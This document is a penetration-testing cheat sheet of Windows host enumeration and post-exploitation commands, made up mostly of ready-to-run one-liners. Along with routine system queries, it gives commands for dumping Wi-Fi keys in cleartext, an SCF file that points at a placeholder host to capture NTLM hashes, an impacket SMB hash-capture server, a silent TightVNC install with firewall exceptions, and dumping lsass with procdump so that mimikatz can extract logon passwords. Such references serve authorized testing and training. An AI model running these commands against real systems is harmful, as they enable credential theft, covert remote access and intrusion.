# Host Enum

### General

#### Check os version

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### Check for additional drives \(meterpreter\)

```bash
show_mount
```

#### Check for additional drives \(wmic\)

```bash
wmic logicaldisk get name|caption
```

#### Check for additional drives \(powershell\)

```bash
get-psdrive
```

#### List installed programs

```bash
reg query HKEY_LOCAL_MACHINE\SOFTWARE
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall
```

#### Check linux subsystem

```bash
C:\Users\<name>\AppData\Local\Packages\CanonicalGroup...
```

#### Search writeable directories

```bash
dir /a-r-d /s /b
```

#### Search files by name

```bash
dir /s *foo*
```

#### Search Files by content

```bash
findstr /s /i <needle> *.*
```

#### Search Files by owner

```bash
dir c:\*.* /S /Q|FIND /i "owner"
```

#### Search files in meterpreter

```bash
search -f *.<ext>`
```

#### Search for alternate data streams \(ads\)

```bash
dir /s /R /a
```

#### Check named pipes in PowerShell

```bash
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
```

#### Grep file contents in PowerShell

```bash
Select-String -Path <path> -Pattern <pattern> | out-host -paging
```

#### Enumerate SMB

```bash
smbmap -R -H \\<ip>
smbclient -L \\<ip> -N
smbclient \\<ip>\share -U <user>
smbget -R <ip>
```

#### Grant permissions with icacls

```bash
icacls <filename> /grant <username>(OI)(CI)F /T
```

#### Search registry

```bash
reg query HKLM /s | findstr /i <item>
reg query HKCU /s | findstr /i <item>
reg query HKLM /f <item> /t REG_SZ /s
reg query HKCU /f <item> /t REG_SZ /s
```

#### Print wlan keys

```bash
netsh wlan show profile <name> key=clear
```

#### PowerShell port scan

```bash
0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip>",$_)) "Port $_ is open!"} 2>$null
```

#### Create local smb server and capture hashes

```bash
sudo impacket-smbserver <name> <path>
```

#### Capture hashes via scf file

```bash
[Shell]
Command=2
IconFile=\\X.X.X.X\xct\file.ico
[Taskbar]
Command=ToggleDesktop
```

#### Get User SID

```text
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
```

#### Deploy TightVNC

```bash
msiexec /i "tightvnc.msi" /quiet /norestart ADDLOCAL="Server,Viewer" VIEWER_ASSOCIATE_VNC_EXTENSION=1 SERVER_REGISTER_AS_SERVICE=1 SERVER_ADD_FIREWALL_EXCEPTION=1 VIEWER_ADD_FIREWALL_EXCEPTION=1 SERVER_ALLOW_SAS=1 SET_USEVNCAUTHENTICATION=1 VALUE_OF_USEVNCAUTHENTICATION=1 SET_PASSWORD=1 VALUE_OF_PASSWORD=PASSWORD SET_USECONTROLAUTHENTICATION=1 VALUE_OF_USECONTROLAUTHENTICATION=1 SET_CONTROLPASSWORD=1 VALUE_OF_CONTROLPASSWORD=PASSWORD
```

#### Grep Registry for keywords:

```text
reg query HKLM /s /f <keyword> (try HKLM/HKCU)
```

#### Find files by date

```bash
forfiles /P C:\ /S /D 10/24/2020 /C "cmd /c echo @PATH"
```

#### Bypass Execution Policy \(for domain users\) by changing registry as local administrator

```bash
HKLM:\Software\Policies\Microsoft\Windows\PowerShell # change value to bypass
```

#### Useful commands in rpcclient

```bash
rpcclient -U <user> <ip>
lookupnames <name>
lookupsids <sid>
```

#### Dumping processes

```bash
procdump.exe -accepteula -ma <pid>
```

We can also use a short custom [program ](https://gist.github.com/xct/f78238aefa6fca8512ee2a7d0bc42f20) to avoid using procdump.

This dump can be read using mimikatz:

```text
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Credentials

Check for stored credentials:

```bash
cmdkey /list
```

### Company Files

This lead to success on numerous occasions. While not technical make sure you look at the files that are on the system. This includes configuration backups, documents, notes, technical documentation and more. 

### Seatbelt

```text
Seatbelt MappedDrives
```

#### 

### Other

Usually you want to run the scripts/tools from the Privilege Escalation Section. Other than that these are interesting as well:

* Screenshot
* Keylogger



